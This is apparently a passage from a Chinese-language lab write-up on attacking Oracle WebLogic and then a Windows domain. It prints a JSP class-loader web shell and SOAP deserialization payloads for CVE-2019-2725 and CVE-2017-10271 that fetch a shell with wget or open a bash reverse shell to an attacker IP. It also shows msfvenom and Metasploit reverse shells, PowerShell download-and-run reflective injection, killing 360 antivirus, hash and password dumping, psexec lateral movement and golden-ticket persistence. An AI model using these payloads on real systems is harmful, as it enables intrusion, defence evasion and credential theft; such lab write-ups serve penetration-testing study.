+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;%!</span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">U</span> <span class="keyword">extends</span> <span class="title class_">ClassLoader</span>&#123;</span><br><span class="line"><span class="comment">//        定义一个U class继承ClassLoader</span></span><br><span class="line">        U(ClassLoader c)&#123;</span><br><span class="line">            <span class="built_in">super</span>(c);</span><br><span class="line">        &#125;</span><br><span class="line"><span class="comment">//        调用父类的初始化</span></span><br><span class="line">        <span class="keyword">public</span> Class <span class="title function_">g</span><span class="params">(<span class="type">byte</span>[] b)</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">super</span>.defineClass(b,<span class="number">0</span>, b.length);</span><br><span class="line"><span class="comment">//            调用父类的defineClass将得到的字节流数组传进入</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">byte</span>[] base64Decode(String str) <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.misc.BASE64Decoder&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> (<span class="type">byte</span>[]) clazz.getMethod(<span class="string">&quot;decodeBuffer&quot;</span>,String.class).invoke(clazz.newInstance(),str);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.util.Base64&quot;</span>);</span><br><span class="line">            <span class="type">Object</span> <span class="variable">getDecoder</span> <span class="operator">=</span> clazz.getMethod(<span class="string">&quot;getDecoder&quot;</span>).invoke(<span class="literal">null</span>);</span><br><span class="line">            <span class="keyword">return</span> (<span class="type">byte</span>[]) getDecoder.getClass().getMethod(<span class="string">&quot;decode&quot;</span>,String.class).invoke(getDecoder,str);</span><br><span class="line">        &#125;</span><br><span class="line"><span class="comment">//      通过两种方法进行base64解码</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">%&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    <span class="type">String</span> <span class="variable">cls</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;wanan&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (cls != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">U</span>(<span class="built_in">this</span>.getClass().getClassLoader()).g(base64Decode(cls)).newInstance().equals(pageContext);</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220623103405467.png"></p>
+<p>查看一下写到哪里&#x2F;_async&#x2F;AsyncResponseService?info</p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220623103218247.png" alt="image-20220623103218247"></p>
+<p>访问&#x2F;_async&#x2F;_async&#x2F;AsyncResponseService</p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220623102726482.png" alt="image-20220623102726482"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /_async/AsyncResponseService HTTP/1.1</span><br><span class="line">Host: 192.168.111.129:7001</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9,en;q=0.8</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 851</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">SOAPAction:</span><br><span class="line">Accept: */*</span><br><span class="line">User-Agent: Apache-HttpClient/4.1.1 (java 1.5)</span><br><span class="line">Connection: keep-alive</span><br><span class="line">content-type: text/xml</span><br><span class="line"></span><br><span class="line">&lt;soapenv:Envelope xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot; xmlns:wsa=&quot;http://www.w3.org/2005/08/addressing&quot;</span><br><span class="line">xmlns:asy=&quot;http://www.bea.com/async/AsyncResponseService&quot;&gt;</span><br><span class="line">&lt;soapenv:Header&gt;</span><br><span class="line">&lt;wsa:Action&gt;xx&lt;/wsa:Action&gt;</span><br><span class="line">&lt;wsa:RelatesTo&gt;xx&lt;/wsa:RelatesTo&gt;</span><br><span class="line">&lt;work:WorkContext xmlns:work=&quot;http://bea.com/2004/06/soap/workarea/&quot;&gt;</span><br><span class="line">&lt;void class=&quot;java.lang.ProcessBuilder&quot;&gt;</span><br><span class="line">&lt;array class=&quot;java.lang.String&quot; length=&quot;3&quot;&gt;</span><br><span class="line">&lt;void index=&quot;0&quot;&gt;</span><br><span class="line">&lt;string&gt;/bin/bash&lt;/string&gt;</span><br><span class="line">&lt;/void&gt;</span><br><span class="line">&lt;void index=&quot;1&quot;&gt;</span><br><span class="line">&lt;string&gt;-c&lt;/string&gt;</span><br><span class="line">&lt;/void&gt;</span><br><span class="line">&lt;void index=&quot;2&quot;&gt;</span><br><span class="line">&lt;string&gt;wget http://192.168.111.1/wanan.txt -O servers/AdminServer/tmp/_WL_internal/bea_wls9_async_response/8tpkys/war/wan.jsp&lt;/string&gt;</span><br><span class="line">&lt;/void&gt;</span><br><span class="line">&lt;/array&gt;</span><br><span class="line">&lt;void method=&quot;start&quot;/&gt;&lt;/void&gt;</span><br><span class="line">&lt;/work:WorkContext&gt;</span><br><span class="line">&lt;/soapenv:Header&gt;</span><br><span class="line">&lt;soapenv:Body&gt;</span><br><span class="line">&lt;asy:onAsyncDelivery/&gt;</span><br><span class="line">&lt;/soapenv:Body&gt;&lt;/soapenv:Envelope&gt;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220623103936008.png" alt="image-20220623103936008"></p>
+<p>蚁剑连接一下</p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220623104050830.png" alt="image-20220623104050830"></p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220623104121037.png" alt="image-20220623104121037"></p>
+<p>反弹shell</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/target ip/target port 0&gt;&amp;1</span><br><span class="line">这里&gt;&amp;需要转换，否则无法利用</span><br><span class="line">例：</span><br><span class="line">bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.111.128/7777 0&amp;gt;&amp;amp;1</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220623105523532.png" alt="image-20220623105523532"></p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220623105557553.png" alt="image-20220623105557553"></p>
+<h3 id="weblogic-CVE-2017-10271"><a href="#weblogic-CVE-2017-10271" class="headerlink" title="weblogic CVE-2017-10271"></a>weblogic CVE-2017-10271</h3><p>要跟上一个环境分开的话就重启一下</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">reboot</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd /root/vulnhub/weblogic/CVE-2017-10271/</span><br><span class="line">vim docker-compose.yml</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220623111549936.png" alt="image-20220623111549936"></p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220623111825081.png" alt="image-20220623111825081"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd /root/Oracle/Middleware/user_projects/domains/base_domain/bin</span><br><span class="line">vi setDomainEnv.sh</span><br><span class="line"></span><br><span class="line">debugFlag=&quot;true&quot;</span><br><span class="line">export debugFlag</span><br><span class="line">DEBUG_PORT=8888</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220623112118921.png" alt="image-20220623112118921"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker cp 51bde427044b:/root ./weblogic_jars</span><br><span class="line">mkdir weblogic_jars/10271</span><br><span class="line">find ./weblogic_jars -name *.jar -exec cp &#123;&#125; ./weblogic_jars/10271/ \;</span><br></pre></td></tr></table></figure>
+
+<p>打开wlserver_10.3</p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220623123036029.png" alt="image-20220623123036029"></p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220623123128519.png" alt="image-20220623123128519"></p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220623123144978.png" alt="image-20220623123144978"></p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220623123228744.png" alt="image-20220623123228744"></p>
+<p>打个断点</p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220623123413445.png" alt="image-20220623123413445"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://192.168.111.129:7001/wls-wsat/CoordinatorPortType</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220623123451668.png" alt="image-20220623123451668"></p>
+<p>访问这个路径 显示以下页面可能存在漏洞</p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220623123531229.png" alt="image-20220623123531229"></p>
+<p>下面的也可以尝试</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/wls-wsat/CoordinatorPortType</span><br><span class="line">/wls-wsat/RegistrationPortTypeRPC</span><br><span class="line">/wls-wsat/ParticipantPortType</span><br><span class="line">/wls-wsat/RegistrationRequesterPortType</span><br><span class="line">/wls-wsat/CoordinatorPortType11</span><br><span class="line">/wls-wsat/RegistrationPortTypeRPC11</span><br><span class="line">/wls-wsat/ParticipantPortType11</span><br><span class="line">/wls-wsat/RegistrationRequesterPortType11</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220623123921048.png" alt="image-20220623123921048"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /wls-wsat/CoordinatorPortType HTTP/1.1</span><br><span class="line">Host: 192.168.111.129:7001</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:67.0) Gecko/20100101 Firefox/67.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Content-Type: text/xml</span><br><span class="line">Content-Length: 641</span><br><span class="line"></span><br><span class="line">&lt;soapenv:Envelope xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;&gt;</span><br><span class="line">&lt;soapenv:Header&gt;</span><br><span class="line">&lt;work:WorkContext xmlns:work=&quot;http://bea.com/2004/06/soap/workarea/&quot;&gt;</span><br><span class="line">&lt;java version=&quot;1.4.0&quot; class=&quot;java.beans.XMLDecoder&quot;&gt;</span><br><span class="line">&lt;void class=&quot;java.lang.ProcessBuilder&quot;&gt;</span><br><span class="line">&lt;array class=&quot;java.lang.String&quot; length=&quot;3&quot;&gt;</span><br><span class="line">&lt;void index=&quot;0&quot;&gt;</span><br><span class="line">&lt;string&gt;/bin/bash&lt;/string&gt;</span><br><span class="line">&lt;/void&gt;</span><br><span class="line">&lt;void index=&quot;1&quot;&gt;</span><br><span class="line">&lt;string&gt;-c&lt;/string&gt;</span><br><span class="line">&lt;/void&gt;</span><br><span class="line">&lt;void index=&quot;2&quot;&gt;</span><br><span class="line">&lt;string&gt;bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.111.128/7777 0&amp;gt;&amp;amp;1&lt;/string&gt;</span><br><span class="line">&lt;/void&gt;</span><br><span class="line">&lt;/array&gt;</span><br><span class="line">&lt;void method=&quot;start&quot;/&gt;&lt;/void&gt;</span><br><span class="line">&lt;/java&gt;</span><br><span class="line">&lt;/work:WorkContext&gt;</span><br><span class="line">&lt;/soapenv:Header&gt;</span><br><span class="line">&lt;soapenv:Body/&gt;</span><br><span class="line">&lt;/soapenv:Envelope&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220623124444735.png" alt="image-20220623124444735"></p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220623130255437.png" alt="image-20220623130255437"></p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220623131747359.png" alt="image-20220623131747359"></p>
+<p>VE-2017-10271漏洞主要是由WebLogic Server WLS组件远程命令执行漏洞，主要由wls-wsat.war触发该漏洞，触发漏洞url如下： <a target="_blank" rel="noopener" href="http://192.168.xx.xx:7001/wls-wsat/CoordinatorPortType">http://192.168.xx.xx:7001/wls-wsat/CoordinatorPortType</a> post数据包，通过构造构造SOAP（XML）格式的请求，在解析的过程中导致XMLDecoder反序列化漏洞。</p>
+<p>在weblogic&#x2F;wsee&#x2F;jaxws&#x2F;workcontext&#x2F;WorkContextServerTube类的processRequest方法中，处理POST数据包中的XML数据。var1即是传入的xml数据</p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220623133423937.png" alt="image-20220623133423937"></p>
+<p>到readHeaderOld方法中，处理读取的xml</p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220623134333236.png" alt="image-20220623134333236"></p>
+<p>前面获取了xml，使用ByteArrayOutputStream转换成了字节流赋值给var4，然后调用了WorkContextXmlInputAdapter传入了var4</p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220623135647500.png" alt="image-20220623135647500"></p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220623135629181.png" alt="image-20220623135629181"></p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220623135934223.png" alt="image-20220623135934223"></p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220623135954784.png" alt="image-20220623135954784"></p>
+<p>继续跟进几个方法后，到了WorkContextLocalMap#receiveRequest，165行调用了WorkContextEntryImpl的readEntry方法</p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220623140131705.png" alt="image-20220623140131705"></p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220623140927455.png" alt="image-20220623140927455"></p>
+<p>跟进readUTF，在这里进行了xmlDecoder.readObject触发了xmlDecoder的反序列化，执行了ProcessBuilder.start()</p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220623141023945.png" alt="image-20220623141023945"></p>
+<h3 id="利用CVE-2019-2725写shell"><a href="#利用CVE-2019-2725写shell" class="headerlink" title="利用CVE-2019-2725写shell"></a>利用CVE-2019-2725写shell</h3><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220624213014858.png" alt="image-20220624213014858"></p>
+<p>把shell写到images目录中</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">\Oracle\Middleware\wlserver_10.3\server\lib\consoleapp\webapp\framework\skins\wlsconsole\images\wan.jsp</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220624213517728.png" alt="image-20220624213517728"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://192.168.111.80:7001/console/framework/skins/wlsconsole/images/wan.jsp</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220624213730822.png" alt="image-20220624213730822"></p>
+<h2 id="内网"><a href="#内网" class="headerlink" title="内网"></a>内网</h2><p>下载PowerSploit</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/PowerShellMafia/PowerSploit.git</span><br></pre></td></tr></table></figure>
+
+<p>生成木马</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp -f exe lhost=192.168.111.80 lport=4444 -o ./shell.exe</span><br></pre></td></tr></table></figure>
+
+<p>转换成base64</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat shell.exe | base64 &gt;base64.txt</span><br></pre></td></tr></table></figure>
+
+<p>开启监听</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/x64/meterpreter/reverse_tcp</span><br><span class="line">set lhost 192.168.111.128</span><br><span class="line">set lport 4444</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<p>python起一个网络服务</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 -m http.server</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220625130255870.png" alt="image-20220625130255870"></p>
+<p>远程加载powershell的pe反射模块</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">iex(New-Object Net.WebClient).DownloadString(&quot;http://192.168.111.128:8000/PowerSploit/CodeExecution/Invoke-ReflectivePEInjection.ps1&quot;)</span><br></pre></td></tr></table></figure>
+
+<p>继续加载base64编码后的payload，赋值给一个变量</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$b64Str = (New-Object Net.WebClient).DownloadString(&quot;http://192.168.111.128:8000/base64.txt&quot;)</span><br></pre></td></tr></table></figure>
+
+<p>靶机解码payload</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$PEBytes = [System.Convert]::FromBase64String($b64Str)</span><br></pre></td></tr></table></figure>
+
+<p>反射调用</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Invoke-ReflectivePEInjection -PEBytes $PEBytes -ForceASLR</span><br></pre></td></tr></table></figure>
+
+<p>把上面的写成脚本 wan.ps1</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">iex(New-Object Net.WebClient).DownloadString(&quot;http://192.168.111.128:8000/PowerSploit/CodeExecution/Invoke-ReflectivePEInjection.ps1&quot;);  $b64Str = (New-Object Net.WebClient).DownloadString(&quot;http://192.168.111.128:8000/base64.txt&quot;) ;  $PEBytes = [System.Convert]::FromBase64String($b64Str) ;  Invoke-ReflectivePEInjection -PEBytes $PEBytes -ForceASLR</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220625144402385.png" alt="image-20220625144402385"></p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220625144512779.png" alt="image-20220625144512779"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">powershell -ExecutionPolicy Bypass -File C:/Windows/wan.ps1</span><br></pre></td></tr></table></figure>
+
+<p>弹不上来 但是本地尝试可以</p>
+<p>换种方法</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set payload java/jsp_shell_reverse_tcp</span><br><span class="line">set lhost 192.168.111.128</span><br><span class="line">set lport 5555</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220625155243987.png" alt="image-20220625155243987"></p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220625155247879.png" alt="image-20220625155247879"></p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220625155328294.png" alt="image-20220625155328294"></p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220625155656797.png" alt="image-20220625155656797"></p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220625155702197.png" alt="image-20220625155702197"></p>
+<p>输出的东西都一样还是弹不上来</p>
+<p>在换一种方式</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use exploit/multi/misc/weblogic_deserialize_asyncresponseservice</span><br><span class="line">set payload  windows/x64/meterpreter/reverse_tcp </span><br><span class="line">set LHOST 192.168.111.128</span><br><span class="line">set rhosts 192.168.111.80</span><br><span class="line">set target Windows</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220625160229665.png" alt="image-20220625160229665"></p>
+<p>迁移进程</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ps -ef | grep svchost.exe</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">migrate 632</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220625160748261.png" alt="image-20220625160748261"></p>
+<p>成功获取到system权限</p>
+<p>查看杀软</p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220625161308277.png" alt="image-20220625161308277"></p>
+<p>尝试杀一下</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ps | grep 360</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220625161331044.png" alt="image-20220625161331044"></p>
+<p>虽然杀了但是又重启了</p>
+<p>我们尝试出入360的主动防御</p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220625161446555.png" alt="image-20220625161446555"></p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220625161612262.png" alt="image-20220625161612262"></p>
+<p>我还没杀就自己没了?</p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220625161745885.png" alt="image-20220625161745885"></p>
+<p>我们在把主动防御杀了.先迁移回去</p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220625161935697.png" alt="image-20220625161935697"></p>
+<p>可以看到360确实被我们干死了</p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220625162104373.png" alt="image-20220625162104373"></p>
+<p>派生给cs</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use windows/local/payload_inject</span><br><span class="line">set disablepayloadhandler true</span><br><span class="line">set payload windows/meterpreter/reverse_http</span><br><span class="line">set lhost 192.168.111.129 #teamserver 地址</span><br><span class="line">set lport 5555  #非会话监听地址</span><br><span class="line">set session 3 #会话session id</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220625170351784.png" alt="image-20220625170351784"></p>
+<p>看一下上面一样就好</p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220625170402737.png" alt="image-20220625170402737"></p>
+<p>成功接收到会话</p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220625170428942.png" alt="image-20220625170428942"></p>
+<p>抓密码</p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220625171155271.png" alt="image-20220625171155271"></p>
+<p>收集一下信息 在一里面命令挺全的了,这里就拿重要的来了</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">shell ipconfig/all</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220625171511419.png" alt="image-20220625171511419"></p>
+<p>双网卡</p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220625171609965.png" alt="image-20220625171609965"></p>
+<p>域下信息收集不到的话,就去全部换原一下快照</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net view </span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220625175626891.png" alt="image-20220625175626891"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">shell net user /domain</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220625174503902.png" alt="image-20220625174503902"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">shell net group &quot;domain controllers&quot; /domain</span><br><span class="line">查看域控制器</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220625174704887.png" alt="image-20220625174704887"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">shell net group &quot;domain computers&quot; /domain</span><br><span class="line">查看当前域成员计算机列表</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220625174726630.png" alt="image-20220625174726630"></p>
+<p>psexec 是微软 pstools 工具包中最常用的一个工具，也是在内网渗透中的免杀渗透利器。psexec 能够在命令行下在对方没有开启 telnet 服务的时候返回一个半交互的命令行，像 telnet 客户端一样。原理是基于IPC共享，所以要目标打开 445 端口。另外在启动这个 psexec 建立连接之后对方机器上会被安装一个服务。</p>
+<p>利用 psexec 横向移动至DC，域控成功上线。</p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220625175107684.png" alt="image-20220625175107684"></p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220625175650424.png" alt="image-20220625175650424"></p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220625175835768.png" alt="image-20220625175835768"></p>
+<p>成功上线</p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220625175851210.png" alt="image-20220625175851210"></p>
+<h2 id="权限维持"><a href="#权限维持" class="headerlink" title="权限维持"></a>权限维持</h2><p>在域控获得KRBTGT账户NTLM密码哈希和SID</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hashdump</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220625180929543.png" alt="image-20220625180929543"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">logonpasswords</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220625182804854.png" alt="image-20220625182804854"></p>
+<h3 id="黄金票据利用"><a href="#黄金票据利用" class="headerlink" title="黄金票据利用"></a>黄金票据利用</h3><p>黄金票据是伪造票据授予票据(TGT),也被称为认证票据,TGT仅用于向域服务器上的密钥分配中心(KDC)证明用户已经被其他的域控制器认证</p>
+<p>黄金票据的条件</p>
+<ol>
+<li>域名城</li>
+<li>域的sid值</li>
+<li>域的krbtgt账户htlm密码哈希</li>
+<li>伪造用户名</li>
+</ol>
+<p>黄金票据可以在拥有普通域用户权限和krbtgt账户的hash的情况下用来获取域管理员权限,上面已经获取了域控的system权限了,还可以使用黄金票据做权限维持,当域控制器权限掉了之后,在通过域内其他任意机器伪造票据重新湖区最高权限</p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220625182848364.png" alt="image-20220625182848364"></p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220625182904696.png" alt="image-20220625182904696"></p>
+</article><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E9%9D%B6%E5%9C%BA/">靶场</a><a class="post-meta__tags" href="/tags/ATT-CK/">ATT&amp;CK</a></div><div class="post_share"><div class="social-share" data-image="https://cdn.pixabay.com/photo/2016/11/06/05/36/lake-1802337_1280.jpg" data-sites="qq,wechat,weibo,facebook,twitter"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-full"><a href="/%E5%86%85%E7%BD%91/%E5%86%85%E7%BD%91/ATT&amp;CK(%E4%B8%80)/"><img class="prev-cover" src="https://cdn.pixabay.com/photo/2017/07/19/01/41/clouds-2517653_1280.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">ATT&amp;CK(一)</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/%E5%86%85%E7%BD%91/%E5%86%85%E7%BD%91/ATT&CK(%E4%B8%80)/" title="ATT&amp;CK(一)"><img class="cover" src="https://cdn.pixabay.com/photo/2017/07/19/01/41/clouds-2517653_1280.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt 